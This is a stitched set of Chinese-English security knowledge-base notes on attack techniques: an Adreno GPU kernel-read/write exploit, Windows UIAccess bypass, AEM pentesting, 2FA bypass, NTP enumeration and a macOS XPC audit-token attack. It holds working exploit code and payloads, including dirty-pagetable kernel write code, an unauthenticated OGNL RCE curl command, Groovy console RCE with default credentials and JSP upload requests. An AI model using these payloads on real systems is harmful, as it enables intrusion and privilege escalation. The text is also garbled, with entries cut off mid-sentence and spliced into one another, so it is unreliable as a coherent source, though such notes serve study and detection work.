title: Adreno A7xx SDS--RB privilege 绕过 (GPU SMMU takeover to Kernel R-W)
content: 来源路径： 02-知识点/防御检测与OPSEC/Adreno A7xx SDS--RB privilege 绕过 (GPU SMMU takeover to Kernel R-W).md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Adreno A7xx SDS--RB privilege 绕过 (GPU SMMU takeover to Kernel R-W) [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Adreno A7xx SDS--RB privilege 绕过 (GPU SMMU takeover to Kernel R-W) 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 Adreno A7xx SDS--RB privilege 绕过 (GPU SMMU takeover to Kernel R-W) 建立行为证据、检测逻辑和操作暴露面。 优先关注：Adreno A7xx SDS->RB privilege 绕过 (GPU SMMU takeover to Kernel R/W)、Background: IB levels, SDS and the $12 mask、利用 overview、Building the SDS command sequence、Finding Samsung kernel physbase under physical KASLR；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Adreno A7xx SDS->RB privilege 绕过 (GPU SMMU takeover to Kernel R/W) Background: IB levels, SDS and the $12 mask 利用 overview Building the SDS command sequence Finding Samsung kernel physbase under physical KASLR Stabilizing to fast, reliable CPU-side kernel R/W (dirty pagetable) 检测 Impact See also # 核心要点 Primitive: Execute privileged CP packets (e.g., CP SMMU TABLE UPDATE) from SDS, which is user-controlled. Microcode tracks the current IB level in register $12 and gates privileged packets so they are only accepted when the effective level corresponds to IB0 (kernel RB). Bug: A7xx microcode kept masking $12 with 0x3 (2 bits) instead of 0x7 (3 bits). Since IB4 & 0x3 == 0, SDS was misidentified as IB0, allowing privileged packets from user-controlled SDS. Goal: From SDS (misread as IB0) issue privileged CP packets to re-point the GPU SMMU to attacker-crafted page tables, then use GPU copy/write packets for arbitrary physical R/W. Finally, pivot to a fast CPU-side R/W via dirty pagetable. Enter SDS and execute: CP MEM WRITE / CP MEM TO MEM -> implement write/read primitives Write: CP MEM WRITE to an attacker-chosen GPU VA whose PTEs you map to a chosen PA -> arbitrary physical write Read: CP MEM TO MEM copies 4/8 bytes from target PA to a userspace-shared buffer (batch for larger reads) Excessive GPU traffic can cause UI blackouts and reboots; reads are small (4/8B) and sync is slow by default. Overwrite B’s PTE to point to the last-level pagetable managing A/B with RW attributes (phys to readwrite pte) Write via B’s VA to mutate A’s PTE to map target PFNs; read/write kernel memory via A’s VA, flushing TLB until a sentinel flips Telemetry: alert if CP SMMU TABLE UPDATE (or similar privileged opcodes) appears outside RB/IB0, especially in SDS; monitor anomalous bursts of 4/8-byte CP MEM TO MEM and excessive TLB flush patterns # 命令 / 载荷 / 操作片段 # 1. Background: IB levels, SDS and the $12 mask 123456A6XX | A7XXRB & 3 == 0 | RB & 3 == 0IB1 & 3 == 1 | IB1 & 3 == 1IB2 & 3 == 2 | IB2 & 3 == 2IB3 (SDS) & 3 == 3 | IB3 & 3 == 3 | IB4 (SDS) & 3 == 0 <-- misread as IB0 if mask is 0x3 # 2. Background: IB levels, SDS and the $12 mask 123456@@ CP_SMMU_TABLE_UPDATE- and $02, $12, 0x3+ and $02, $12, 0x7@@ CP_FIXED_STRIDE_DRAW_TABLE- and $02, $12, 0x3+ and $02, $12, 0x7 # 3. Finding Samsung kernel physbase under physical KASLR 12345678910while (!ctx->kernel.pbase) { offset += 0x8000; uint64_t d1 = kernel_physread_u64(ctx, base + offset); if (d1 != 0xd10203ffd503233f) continue; // first 8 bytes of _stext uint64_t d2 = kernel_physread_u64(ctx, base + offset + 8); if (d2 == 0x910083fda9027bfd) { // second 8 bytes of _stext ctx->kernel.pbase = base + offset - 0x10000; break; }} # 4. Finding Samsung kernel physbase under physical KASLR 1_stext = 0xffffffc008000000 + (Kernel Code & ~0xa8000000) # 5. Stabilizing to fast, reliable CPU-side kernel R/W (dirty pagetable) 123456789101112131415161718uint64_t *map = mmap((void*)0x1000, PAGE_SIZE*2, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);uint64_t *page_map = (void*)((uint64_t)map + PAGE_SIZE);page_map[0] = 0x4242424242424242;uint64_t tsk = get_curr_task_struct(ctx);uint64_t mm = kernel_vread_u64(ctx, tsk + OFFSETOF_TASK_STRUCT_MM);uint64_t mm_pgd = kernel_vread_u64(ctx, mm + OFFSETOF_MM_PGD);uint64_t pgd_off = get_pgd_offset((uint64_t)map);uint64_t phys_pmd = kernel_vread_u64(ctx, mm_pgd + pgd_off) & ~((1<<12)-1);uint64_t pmd_off = get_pmd_offset((uint64_t)map);uint64_t phys_pte = kernel_pread_u64(ctx, phys_pmd + pmd_off) & ~((1<<12)-1);uint64_t pte_off = get_pte_offset((uint64_t)map);uint64_t pte_addr = phys_pte + pte_off;uint64_t new_pte = phys_to_readwrite_pte(pte_addr);kernel_write_u64(ctx, pte_addr + 8, new_pte, false);while (page_map[0] == 0x4242424242424242) flush_tlb(); # 工具与参考入口 CVE-2025-21479: Adreno A7xx SDS->RB privilege 绕过 to kernel R/W (Samsung S23) Mesa freedreno afuc disassembler README (microcode + packets) Dirty pagetable (archive) # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与

title: Admin Protection Bypasses via UIAccess 技术笔记
content: 来源路径： 02-知识点/防御检测与OPSEC/Admin Protection Bypasses via UIAccess 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # Admin Protection Bypasses via UIAccess 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 Admin Protection Bypasses via UIAccess 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 Admin Protection Bypasses via UIAccess 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：Admin Protection Bypasses via UIAccess、Overview、令牌 shaping and integrity levels、Why UIAccess enables an Admin Protection escape、HWND-to-process handle primitive (GetProcessHandleFromHwnd / NtUserGetWindowProcessHandle)；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 1 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Admin Protection Bypasses via UIAccess Overview 令牌 shaping and integrity levels Why UIAccess enables an Admin Protection escape HWND-to-process handle primitive (GetProcessHandleFromHwnd / NtUserGetWindowProcessHandle) Secure-directory validation weaknesses (AppInfo AiCheckSecureApplicationDirectory) Attack workflow (High IL without a prompt) Enumerating candidate writable paths Related # 核心要点 Windows AppInfo exposes RAiLaunchAdminProcess to spawn UIAccess processes (intended for accessibility). UIAccess bypasses most User Interface Privilege Isolation (UIPI) message filtering so accessibility software can drive higher-IL UI. Enabling UIAccess directly requires NtSetInformationToken(TokenUIAccess) with SeTcbPrivilege, so low-priv callers rely on the service. The service performs three checks on the target binary before setting UIAccess: Signed by any certificate trusted by the Local Machine root store (no EKU/Microsoft requirement). If the checks succeed, AppInfo copies the caller 令牌，enables UIAccess, and bumps Integrity Level (IL): If the caller 令牌 already has UIAccess, IL is left unchanged. On Windows 10 1803+ the API moved into Win32k (NtUserGetWindowProcessHandle) and can open a process handle using a caller-supplied DesiredAccess. The kernel path uses ObOpenObjectByPointer(..., KernelMode, ...), which bypasses normal user-mode access checks. Preconditions in practice: the target window must be on the same desktop, and UIPI checks must pass. Historically, a caller with UIAccess could 绕过 UIPI failure and still get a kernel-mode handle (fixed as CVE-2023-41772). Practical abuse flow: enumerate or locate HWNDs (e.g., EnumWindows/FindWindowEx), resolve the owning PID (GetWindowThreadProcessId), call GetProcessHandleFromHwnd, then use the returned handle for memory read/write or code-hijack primitives. Directory named streams: Excluded writable directories (e.g., C:\Windows\tracing) can be bypassed with a named stream on the directory itself, e.g. C:\Windows\tracing:file.exe. The string checks see C:\Windows\ and miss the excluded subpath. Run as Administrator for broader visibility; set -ProcessId to a low-priv process to mirror that 令牌’s access. # 命令 / 载荷 / 操作片段 # 1. Enumerating candidate writable paths 123$paths = "C:\\Windows","C:\\Program Files","C:\\Program Files (x86)"Get-AccessibleFile -Win32Path $paths -Access Execute,WriteData ` -DirectoryAccess AddFile -Recurse -ProcessId <PID> # 工具与参考入口 Bypassing Administrator Protection by Abusing UI Access GetProcessHandleFromHwnd (GPHFH) Deep Dive # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: AI Risks 技术笔记
content: 来源路径： 02-知识点/防御检测与OPSEC/AI Risks 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # AI Risks 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 AI Risks 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 AI Risks 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：AI Risks、OWASP Top 10 Machine Learning Vulnerabilities、Google SAIF Risks、Mitre AI ATLAS Matrix、LLMJacking (令牌 Theft & Resale of Cloud-hosted LLM Access)；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 AI Risks OWASP Top 10 Machine Learning Vulnerabilities Google SAIF Risks Mitre AI ATLAS Matrix LLMJacking (令牌 Theft & Resale of Cloud-hosted LLM Access) Self-hosted LLM inference hardening Prompt leakage via debug and monitoring endpoints Rootless containers with no network and UNIX sockets GPU device-node minimization LSM confinement for inference workers # 核心要点 For an updated and detailed list of the top 10 machine learning vulnerabilities, refer to the OWASP Top 10 Machine Learning Vulnerabilities project. Input Manipulation Attack: An attacker adds tiny, often invisible changes to incoming data so the model makes the wrong decision.\ Data Poisoning Attack: The training set is deliberately polluted with bad samples, teaching the model harmful rules.\ Model Inversion Attack: By probing outputs, an attacker builds a reverse model that reconstructs sensitive features of the original inputs.\ Example: Re‑creating a patient's MRI image from a cancer‑检测 model's predictions. Membership Inference Attack: The adversary tests whether a specific record was used during training by spotting confidence differences.\ Example: Confirming that a person's bank transaction appears in a fraud‑检测 model's training data. Model Theft: Repeated querying lets an attacker learn decision boundaries and clone the model's behavior (and IP).\ AI Supply‑Chain Attack: Compromise any component (data, libraries, pre‑trained weights, CI/CD) in the ML pipeline to corrupt downstream models.\ Transfer Learning Attack: Malicious logic is planted in a pre‑trained model and survives fine‑tuning on the victim's task.\ Model Skewing: Subtly biased or mislabeled data shifts the model's outputs to favor the attacker's agenda.\ Output Integrity Attack: The attacker alters model predictions in transit, not the model itself, tricking downstream systems.\ Model Poisoning --- Direct, targeted changes to the model parameters themselves, often after gaining write access, to alter behavior.\ Example: Tweaking weights on a fraud‑检测 model in production so transactions from certain cards are always approved. # 命令 / 载荷 / 操作片段 # 1. Prompt leakage via debug and monitoring endpoints 1234567891011121314151617map "$request_method:$uri" $llm_whitelist { default 0; "GET:/health" 1; "GET:/v1/models" 1; "POST:/v1/completions" 1; "POST:/v1/chat/completions" 1;}server { listen 127.0.0.1:80; location / { if ($llm_whitelist = 0) { return 403; } proxy_pass http://unix:/run/llama-cpp/llama-cpp.sock:; }} # 2. Rootless containers with no network and UNIX sockets 123456789101112podman run --rm -d \ --network none \ --user 1000:1000 \ --userns=keep-id \ --umask=007 \ --volume /var/lib/models:/models:ro \ --volume /srv/llm/socks:/run/llama-cpp \ ghcr.io/ggml-org/llama.cpp:server-cuda13 \ --host /run/llama-cpp/llama-cpp.sock \ --model /models/model.gguf \ --parallel 4 \ --no-slots # 3. GPU device-node minimization 123options nvidia NVreg_DeviceFileUID=0options nvidia NVreg_DeviceFileGID=0options nvidia NVreg_DeviceFileMode=0660 # 4. content: 来源路径： 02-知识点/防御检测与OPSEC/AEM (Adobe Experience Manager) Pentesting 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # AEM (Adobe Experience Manager) Pentesting 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 AEM (Adobe Experience Manager) Pentesting 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 AEM (Adobe Experience Manager) Pentesting 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：AEM (Adobe Experience Manager) Pentesting、Fingerprinting、High-value unauthenticated endpoints、Dispatcher 绕过 tricks (still working in 2025/2026)、Common misconfigurations (still alive in 2026)；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 8 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 AEM (Adobe Experience Manager) Pentesting Fingerprinting High-value unauthenticated endpoints Dispatcher 绕过 tricks (still working in 2025/2026) Common misconfigurations (still alive in 2026) Recent vulnerabilities (service-pack cadence) 利用 snippets 5.1 RCE via dispatcher 绕过 + JSP 上传 5.2 SSRF to RCE (historical < 6.3) 5.3 OGNL RCE on AEM Forms JEE (CVE-2025-54253) 5.4 QueryBuilder 哈希 disclosure (encoded slash 绕过) Tooling # 核心要点 From an attacker perspective AEM instances very often expose dangerous development endpoints, weak Dispatcher rules, default 凭据 and a long tail of CVEs that are patched every quarter. The checklist below focuses on externally reachable (unauth) attack surface that keeps showing up in real engagements (2022-2026). /.json, /.1.json | JCR nodes via DefaultGetServlet | Often blocked, but Dispatcher 绕过 (see below) works. /system/console/status-*, /system/console/bundles | OSGi/Felix console | 403 by default; if exposed & creds found ⇒ bundle - 上传 RCE. /crx/packmgr/index.jsp | Package Manager | Allows authenticated content packages → JSP 载荷 上传. /adminui/debug | AEM Forms on JEE Struts dev-mode OGNL evaluator | On misconfigured Forms installs (CVE-2025-54253) this endpoint executes unauthenticated OGNL → RCE. Encoded slash 绕过 (2025 KB ka-27832) aem-hacker – Swiss-army 枚举 script, supports dispatcher 绕过，SSRF 检测，default-creds checks and more. Tenable WAS plugin 115065 – Detects QueryBuilder 哈希 disclosure & encoded-slash 绕过 automatically (published Dec 2025). osgi-infect – 上传 malicious OSGi bundle via /system/console/bundles if creds available. # 命令 / 载荷 / 操作片段 # 1. Fingerprinting 1234$ curl -s -I https://target | egrep -i "aem|sling|cq"X-Content-Type-Options: nosniffX-Dispatcher: hu1 # header added by AEM DispatcherX-Vary: Accept-Encoding # 2. Dispatcher 绕过 tricks (still working in 2025/2026) 1GET /bin/querybuilder.json;%0aa.css?path=/home&type=rep:User HTTP/1.1 # 3. Dispatcher 绕过 tricks (still working in 2025/2026) 1GET /%2fbin%2fquerybuilder.json?path=/etc&1_property=jcr:primaryType HTTP/1.1 # 4. Common misconfigurations (still alive in 2026) 1curl -u admin:admin -d 'script=println "pwn".execute()' https://target/bin/groovyconsole/post.json # 5. 5.1 RCE via dispatcher 绕过 + JSP 上传 1234567# 1. Create a node that will become /content/evil.jspPOST /content/evil.jsp;%0aa.css HTTP/1.1Content-Type: application/x-www-form-urlencoded:contentType=text/plainjcr:data=<% out.println("pwned"); %>:operation=import # 6. 5.3 OGNL RCE on AEM Forms JEE (CVE-2025-54253) 12# Unauth devMode OGNL to run whoamicurl -k "https://target:8443/adminui/debug?expression=%23cmd%3D%27whoami%27,%23p=new%20java.lang.ProcessBuilder(%23cmd).start(),%23out=new%20java.io.InputStreamReader(%23p.getInputStream()),%23br=new%20java.io.BufferedReader(%23out),%23br.readLine()" # 7. 5.4 QueryBuilder 哈希 disclosure (encoded slash 绕过) 1GET /%2fbin%2fquerybuilder.json?path=/home&type=rep:User&p.hits=full&p.nodedepth=2&p.offset=0 HTTP/1.1 # 8. Tooling 1python3 aem_hacker.py -u https://target --host attacker-ip # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 SSRF 服务端请求伪造 CTF 取证隐写 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: 2FA-MFA-OTP 绕过
content: 来源路径： 02-知识点/防御检测与OPSEC/2FA-MFA-OTP 绕过.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 2FA-MFA-OTP 绕过 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 2FA-MFA-OTP 绕过 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 2FA-MFA-OTP 绕过 建立行为证据、检测逻辑和操作暴露面。 优先关注：2FA/MFA/OTP 绕过、Enhanced Two-Factor 认证 绕过 Techniques、Direct Endpoint Access、令牌 Reuse、Utilization of Unused Tokens；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页当前以概念和流程为主；后续实验时可补充最小复现命令和输出样例。 # 关键主题 2FA/MFA/OTP 绕过 Enhanced Two-Factor 认证 绕过 Techniques Direct Endpoint Access 令牌 Reuse Utilization of Unused Tokens Exposure of 令牌 Verification Link 利用 Session Manipulation 密码 Reset Mechanism OAuth Platform Compromise Brute Force Attacks Rate Limit Absence Slow Brute Force Code Resend Limit Reset Client-Side Rate Limit Circumvention Internal Actions Lack Rate Limit SMS Code Resend Costs Infinite OTP Regeneration # 核心要点 To 绕过 2FA, access the subsequent endpoint directly, knowing the path is crucial. If unsuccessful, alter the Referrer header to mimic navigation from the 2FA verification page. Reutilizing previously used tokens for 认证 within an account can be effective. Extracting a 令牌 from one's own account to 绕过 2FA in another account can be attempted. Investigate whether the 令牌 is disclosed in a response from the web application. Initiating sessions for both the user's and a victim's account, and completing 2FA for the user's account without proceeding, allows an attempt to access the next step in the victim's account flow, exploiting backend session management limitations. Investigating the 密码 reset function, which logs a user into the application post-reset, for its potential to allow multiple resets using the same link is crucial. Logging in with the newly reset 凭据 might 绕过 2FA. # 工具与参考入口 post this post https://azwi.medium.com/2-factor - 认证 - 绕过 - 3b2bbd907718 # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/防御检测与OPSEC/123-udp：Pentesting NTP 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 123-udp：Pentesting NTP 技术笔记 [!summary] 提炼定位 面向 防御检测与 OPSEC 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 围绕 123-udp：Pentesting NTP 技术笔记 建立检测、规避、溯源或 OPSEC 检查。 把行为、进程链、网络、文件、日志事件转化为可验证线索。 # 中文提炼 核心目标是围绕 123-udp：Pentesting NTP 技术笔记 建立行为证据、检测逻辑和操作暴露面。 优先关注：123/udp：Pentesting NTP、Basic Information、Summary & Security Tips、枚举、Classic ntpd /ntpq/ntpdc；把命令、进程、文件、网络、注册表 / 日志事件映射到检测字段。 区分正常管理行为与攻击行为，避免只按工具名告警；优先写可复现的查询条件。 OPSEC 记录应包括噪声来源、持久化痕迹、清理步骤和不可规避风险。 本页已沉淀 9 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 123/udp：Pentesting NTP Basic Information Summary & Security Tips 枚举 Classic ntpd / ntpq / ntpdc chrony / chronyc (in most modern Linux distros) Nmap Mass/Internet scanning Examine configuration files Recent Vulnerabilities (2023-2025) Advanced Attacks NTP Amplification / Reflection Time-Shift / Delay attacks (Khronos / Chronos research) NTS abuse & 4460/tcp exposure Hardening / Best-Current-Practice (BCP-233 / RFC 8633) Shodan / Censys Dorks Useful 工具 HackTricks Automatic Commands # 核心要点 利用 kits: Proof-of-concept 载荷 for the 2023 ntpq OOB-write series are on GitHub (see Meinberg write-up) and can be weaponised for client-side phishing of sysadmins. The legacy Mode-7 monlist query returns up to 600 host addresses and is still present on thousands of Internet hosts. Because the reply (428-468 bytes/entry) is ~ 200× larger than the 8-byte request, an attacker can reach triple-digit amplification factors. Mitigations: Look for self-signed or expired certificates and weak cipher-suites (non-AEAD). Reference: RFC 8915 §4. Monitor daemon logs for panic events or step adjustments > 1000 s. (Signatures of attack per RFC 8633 §5.3.) # 命令 / 载荷 / 操作片段 # 1. Summary & Security Tips 12123/udp NTP (data + legacy control)4460/tcp NTS-KE (RFC 8915) – TLS key-establishment for NTP # 2. Summary & Security Tips 12PORT STATE SERVICE REASON123/udp open ntp udp-response # 3. Classic ntpd / ntpq / ntpdc 12345678910# Information & variablesntpq -c rv <IP>ntpq -c readvar <IP>ntpq -c peers <IP>ntpq -c associations <IP># Legacy mode-7 (often disabled >=4.2.8p9)ntpdc -c monlist <IP>ntpdc -c listpeers <IP>ntpdc -c sysinfo <IP> # 4. chrony / chronyc (in most modern Linux distros) 123chronyc -a -n tracking -h <IP>chronyc -a -n sources -v -h <IP>chronyc -a -n sourcestats -h <IP> # 5. Nmap 12345# Safe discovery & vuln detectionnmap -sU -sV --script "ntp* and (discovery or vuln) and not (dos or brute)" -p 123 <IP># Explicit monlist checknmap -sU -p123 --script ntp-monlist <IP> # 6. Mass/Internet scanning 12# Check if MONLIST is enabled (zgrab2 module)zgrab2 ntp --monlist --timeout 3 --output-file monlist.json -f "zmap_results.csv" # 7. NTS abuse & 4460/tcp exposure 12345# TLS reconnaissancenmap -sV -p 4460 --script ssl-enum-ciphers,ssl-cert <IP># Grab banner & ALPNopenssl s_client -connect <IP>:4460 -alpn ntske/1 -tls1_3 -ign_eof # 8. Shodan / Censys Dorks 123port:123 "ntpd" # Version bannerudp port:123 monlist:true # Censys tag for vulnerable serversport:4460 "ntske" # NTS-KE # 9. HackTricks Automatic Commands 12345678910111213141516Protocol_Name: NTPPort_Number: 123Protocol_Description: Network Time ProtocolEntry_1: Name: Notes Description: Notes for NTP Note: | The Network Time Protocol (NTP) ensures computers and network devices across variable-latency networks sync their clocks accurately. It's vital for maintaining precise timekeeping in IT operations, security, and logging. NTP's accuracy is essential, but it also poses security risks if not properly managed. https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ntp.htmlEntry_2: Name: Nmap Description: Enumerate NTP Command: nmap -sU -sV --script "ntp* and (discovery or vuln) and not (dos or brute)" -p 123 {IP} # 检查清单 是否提取进程链 / 命令行 / 网络 / 文件 / 日志线索 是否区分攻击行为和正常管理行为 是否记录绕过假设与限制 是否形成检测规则或查询语句 # 关联 防御检测与 OPSEC 总览 知识地图 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

content: 来源路径： 02-知识点/漏洞利用与载荷/macOS xpc connection get audit 令牌 Attack.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # macOS xpc connection get audit 令牌 Attack [!summary] 提炼定位 面向 漏洞利用与载荷 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 快速查找 macOS xpc connection get audit 令牌 Attack 的利用思路、载荷形态或绕过技巧。 先明确目标解析器和约束，再逐步缩小有效 payload。 # 中文提炼 核心目标是把 macOS xpc connection get audit 令牌 Attack 抽象成解析器、过滤器、有效载荷和输出判断。 优先关注：Mach Messages Basic Info、XPC Connection、Vuln Summary、Variant 1: calling xpc connection get audit 令牌 outside of an event handler <a href="#variant-1-calling-xpc connection get audit 令牌 - outside-of-an-event-handler" id="variant-1-calling-xpc connection get audit 令牌 - outside-of-an-event-handler"></a>、Variant 2: reply forwarding；payload 变体按编码、分隔符、大小写、协议、上下文逐个改变。 先证明最小触发，再扩大影响；把不可用变体也记录下来以便判断过滤边界。 防御视角补规范化、白名单、沙箱、最小权限、审计和异常响应。 本页已沉淀 2 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Mach Messages Basic Info XPC Connection Vuln Summary Variant 1: calling xpc connection get audit 令牌 outside of an event handler <a href="#variant-1-calling-xpc connection get audit 令牌 - outside-of-an-event-handler" id="variant-1-calling-xpc connection get audit 令牌 - outside-of-an-event-handler"></a> Variant 2: reply forwarding Discovery Problems The fix <a href="#the-fix" id="the-fix"></a> Finding vulnerable code paths in practice (2024–2025) 利用 primitives you will likely need Useful tooling # 核心要点 For further information check the original post: https://sector7.computest.nl/post/2023-10-xpc-audit - 令牌 - spoofing/. This is a summary: An XPC connection’s audit 令牌 is the audit 令牌 of copied from the most recently received message. Obtaining the audit 令牌 of an XPC connection is critical to many security checks. Two different methods this might be exploitable: 利用 connects to service A and service B Service B can call a privileged functionality in service A that the user cannot Service A calls xpc connection get audit 令牌 while not inside the event handler for a connection in a dispatch async. So a different message could overwrite the Audit 令牌 because it's being dispatched asynchronously outside of the event handler. The 利用 passes to service B the SEND right to service A. The 利用 tries to call the privileged action. In a RC svc A checks the 授权 of this action while svc B overwrote the Audit 令牌 (giving the 利用 access to call the privileged action). 利用 connects with service A which sends the 利用 a message expecting a response in a specific replay port. 利用 sends service B a message passing that reply port. For example, if B has some entitlements or is running as root, it might allow him to ask A to perform a privileged action. For this 授权 check, A obtains the audit 令牌 asynchronously, for example by calling xpc connection get audit 令牌 from dispatch async. # 命令 / 载荷 / 操作片段 # 1. Finding vulnerable code paths in practice (2024–2025) 123456789Interceptor.attach(Module.getExportByName(null, 'xpc_connection_get_audit_token'), { onEnter(args) { const bt = Thread.backtrace(this.context, Backtracer.ACCURATE) .map(DebugSymbol.fromAddress).join('\n'); if (!bt.includes('_xpc_connection_mach_event')) { console.log('[!] xpc_connection_get_audit_token outside handler\n' + bt); } }}); # 2. 利用 primitives you will likely need 1234// Duplicate a SEND right you already holdmach_port_t dup;mach_port_insert_right(mach_task_self(), a_client, a_client, MACH_MSG_TYPE_MAKE_SEND);dup = a_client; // use `dup` when crafting B’s connect packet instead of a fresh client port # 工具与参考入口 https://sector7.computest.nl/post/2023-10-xpc-audit - 令牌 - spoofing/ definition from here SMJobBless Image depicting the 利用 process # 检查清单 是否明确解析器和过滤器 是否从最小 payload 开始 是否验证编码 / 大小写 / 分隔符变体 是否记录可复现请求或样例 # 关联 漏洞利用与载荷总览 知识地图 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

If this isn't verified, an attacker could create a fake certificate to match any other check. Check if the connecting process is signed with the organization’s certificate, (team ID verification). If this isn't verified, any developer certificate from Apple can be used for signing, and connect to the service. If this isn't verified, an old, insecure clients, vulnerable to process injection could be used to connect to the XPC service even with the other checks in place. If this isn't verified, the client might be vulnerable to 代码注入 Developers rarely use the audit 令牌 API call since it’s private, so Apple could change at any time. Additionally, private API usage is not allowed in Mac App Store apps. If the method processIdentifier is used, it might be vulnerable xpc dictionary get audit 令牌 should be used instead of xpc connection get audit 令牌，as the latest could also be vulnerable in certain situations. # 命令 / 载荷 / 操作片段 # 1. Code Examples 1234- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection { //Check connection return YES;} # 2. Code Examples 1234567891011121314151617[...]SecRequirementRef requirementRef = NULL;NSString requirementString = @"anchor apple generic and identifier \"xyz.hacktricks.service\" and certificate leaf [subject.CN] = \"TEAMID\" and info [CFBundleShortVersionString] >= \"1.0\"";/* Check:- Signed by a cert signed by Apple- Check the bundle ID- Check the TEAMID of the signing cert- Check the version used*/// Check the requirements with the PID (vulnerable)SecRequirementCreateWithString(requirementString, kSecCSDefaultFlags, &requirementRef);SecCodeCheckValidity(code, kSecCSDefaultFlags, requirementRef);// Check the requirements wuing the auditToken (secure)SecTaskRef taskRef = SecTaskCreateWithAuditToken(NULL, ((ExtendedNSXPCConnection*)newConnection).auditToken);SecTaskValidateForRequirement(taskRef, (__bridge CFStringRef)(requirementString)) # 3. Code Examples 123456789101112[...]CFDictionaryRef csInfo = NULL;SecCodeCopySigningInformation(code, kSecCSDynamicInformation, &csInfo);uint32_t csFlags = [((__bridge NSDictionary 